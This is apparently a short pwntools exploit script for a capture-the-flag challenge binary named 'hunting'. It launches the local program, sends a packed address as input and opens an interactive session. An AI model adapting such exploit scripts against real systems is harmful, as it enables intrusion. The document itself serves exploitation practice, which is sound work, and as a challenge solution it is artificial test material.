from pwn import *
from struct import pack

p = process('./pwn_hunting/hunting')
p.send(pack('<I', 0x00014020))
p.interactive()